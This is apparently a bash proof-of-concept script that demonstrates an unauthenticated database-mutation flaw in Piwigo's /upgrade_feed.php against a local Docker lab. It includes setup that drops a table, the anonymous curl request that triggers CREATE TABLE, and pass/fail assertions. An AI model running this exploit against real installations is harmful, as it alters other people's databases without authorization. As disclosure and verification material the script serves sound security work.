#!/usr/bin/env bash
# f1-upgrade-feed.sh — F-1 PoC for piwigo:upgrade_feed:unauthenticated_db_mutation.
#
# Regular-user perspective: pure anonymous GET against /upgrade_feed.php
# executes a real DDL statement (CREATE TABLE) on the application database.
# No cookie, no token, no special UA.
#
# Why install/db/145-database.php: it issues an unconditional
#   CREATE TABLE piwigo_image_format (...)
# via pwg_query() with no dblayer guard. The body is reached on mysqli,
# and the side effect is observable via SHOW CREATE TABLE.
#
# Test setup (NOT attacker actions, by analogy with install.php's pre-marking
# of all 121 upgrade rows at install.php:367-385):
#   - DROP piwigo_image_format       (undoes install.php's "145 already done" state)
#   - DELETE piwigo_upgrade WHERE id=145  (marks 145 as not yet applied)
#
# Live demonstration:
#   Anonymous GET /upgrade_feed.php
#     → upgrade_feed.php:78-88 includes install/db/145-database.php
#     → 145 issues CREATE TABLE piwigo_image_format
#     → upgrade_feed.php:91-97 INSERTs the upgrade row back into piwigo_upgrade
#
# Source: upgrade_feed.php:78-88 (foreach + include)
#         install/db/145-database.php:14-25 (CREATE TABLE)
#         include/functions.inc.php:1528 (conf_update_param pattern, omitted — 145 is even simpler)

set -euo pipefail

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
OUT="$HERE/evidence/F1-upgrade-feed"
mkdir -p "$OUT"

WEB="${WEB:-http://localhost:8089}"
DB_USER="piwigo"
DB_PASS="pocpass"
DB_SERVICE="piwigo-poc-db"
PREFIX="piwigo_"
UPGRADE_ID="145"

DB="docker exec $DB_SERVICE mysql --user=$DB_USER --password=$DB_PASS piwigo"

echo "[F-1] === TEST SETUP: undo install.php's 'already applied' state for upgrade $UPGRADE_ID ==="
# (A) drop the table that 145 creates — recreates the pre-145 schema state
$DB -e "DROP TABLE IF EXISTS ${PREFIX}image_format;"
$DB -e "SHOW TABLES LIKE '${PREFIX}image_format';" > "$OUT/setup-after-drop.txt"
echo "  piwigo_image_format after DROP:"
sed 's/^/    /' "$OUT/setup-after-drop.txt"
# (B) mark upgrade 145 as not yet applied
$DB -e "DELETE FROM ${PREFIX}upgrade WHERE id='${UPGRADE_ID}';"
echo "  piwigo_upgrade WHERE id=$UPGRADE_ID: $( $DB -BNe "SELECT COUNT(*) FROM ${PREFIX}upgrade WHERE id='${UPGRADE_ID}';" ) (expect 0)"
echo

echo "[F-1] === BEFORE STATE ==="
$DB -e "SELECT id, applied, description FROM ${PREFIX}upgrade WHERE id='${UPGRADE_ID}';" \
  > "$OUT/db-before-upgrade.txt"
echo "  piwigo_upgrade WHERE id=$UPGRADE_ID:"
sed 's/^/    /' "$OUT/db-before-upgrade.txt"
$DB -e "SHOW CREATE TABLE ${PREFIX}image_format\G" > "$OUT/db-before-table.txt" 2>&1 || true
echo "  piwigo_image_format existence BEFORE:"
if grep -q "doesn't exist" "$OUT/db-before-table.txt" 2>/dev/null; then
  echo "    [confirmed] table does not exist"
else
  echo "    [WARNING] table still exists — see $OUT/db-before-table.txt"
fi
echo

echo "[F-1] === STEP: anonymous GET $WEB/upgrade_feed.php ==="
RESPONSE_FILE="$OUT/response-body.txt"
HTTP=$(curl -sS -o "$RESPONSE_FILE" -w '%{http_code}' "$WEB/upgrade_feed.php")
echo "  HTTP status: $HTTP"
echo "  response: $(wc -c < "$RESPONSE_FILE") bytes"
echo "  response body:"
sed 's/^/    /' "$RESPONSE_FILE"
echo

echo "[F-1] === AFTER STATE — proves CREATE TABLE ran ==="
$DB -e "SHOW CREATE TABLE ${PREFIX}image_format\G" > "$OUT/db-after-table.txt"
echo "  piwigo_image_format AFTER (table now exists):"
sed 's/^/    /' "$OUT/db-after-table.txt"

$DB -e "SELECT id, applied, description FROM ${PREFIX}upgrade WHERE id='${UPGRADE_ID}';" \
  > "$OUT/db-after-upgrade.txt"
echo "  piwigo_upgrade WHERE id=$UPGRADE_ID AFTER:"
sed 's/^/    /' "$OUT/db-after-upgrade.txt"
echo

echo "[F-1] === ASSERTIONS ==="
PASS=true

# (1) Response body must contain "=== upgrade 145"
if grep -q '=== upgrade 145' "$RESPONSE_FILE"; then
  echo "  [PASS] response body contains '=== upgrade 145'"
else
  echo "  [FAIL] response body does NOT contain '=== upgrade 145'"
  PASS=false
fi

# (2) Response body must contain the upgrade description
if grep -q 'add image formats table' "$RESPONSE_FILE"; then
  echo "  [PASS] response body contains the upgrade description"
else
  echo "  [FAIL] response body does NOT contain the description"
  PASS=false
fi

# (3) piwigo_image_format must now exist (CREATE TABLE ran)
if $DB -e "DESCRIBE ${PREFIX}image_format;" > "$OUT/db-after-describe.txt" 2>&1; then
  if grep -q 'format_id' "$OUT/db-after-describe.txt"; then
    echo "  [PASS] piwigo_image_format was CREATED (DDL executed) — schema:"
    sed 's/^/      /' "$OUT/db-after-describe.txt"
  else
    echo "  [FAIL] piwigo_image_format DESCRIBE returned no rows"
    PASS=false
  fi
else
  echo "  [FAIL] piwigo_image_format still does not exist (CREATE TABLE did not run)"
  PASS=false
fi

# (4) piwigo_upgrade.id=145 must now have applied=NOW() and the description
APPLIED=$(awk 'NR==2 {print $2}' "$OUT/db-after-upgrade.txt")
if [[ -n "$APPLIED" && "$APPLIED" != "NULL" && "$APPLIED" != "0000-00-00" ]]; then
  echo "  [PASS] piwigo_upgrade.id=145 has new applied timestamp ($APPLIED)"
else
  echo "  [FAIL] piwigo_upgrade.id=145 not repopulated"
  PASS=false
fi
if grep -q 'add image formats table' "$OUT/db-after-upgrade.txt"; then
  echo "  [PASS] piwigo_upgrade.id=145 description matches install/db/145-database.php"
else
  echo "  [FAIL] piwigo_upgrade.id=145 description does not match"
  PASS=false
fi

# (5) Demonstrate the curl request itself carried no cookies via -v trace
echo "  -- verify the curl request itself carried no cookies --"
TRACE="$OUT/request-trace.txt"
curl -sS -v -o /dev/null "$WEB/upgrade_feed.php" 2> "$TRACE"
if grep -q '^> Cookie:' "$TRACE"; then
  echo "  [FAIL] curl request sent a Cookie header (not anon)"
  PASS=false
else
  echo "  [PASS] curl request sent NO Cookie header"
fi
if grep -qE '^> (Authorization|pwg_token|X-CSRF)' "$TRACE"; then
  echo "  [FAIL] request inadvertently included an auth header"
  PASS=false
else
  echo "  [PASS] request included no Authorization/pwg_token/X-CSRF header"
fi

echo
if $PASS; then
  echo "[F-1] === RESULT: PASS — anonymous DDL via /upgrade_feed.php confirmed ==="
  exit 0
else
  echo "[F-1] === RESULT: FAIL — see assertions above ==="
  exit 1
fi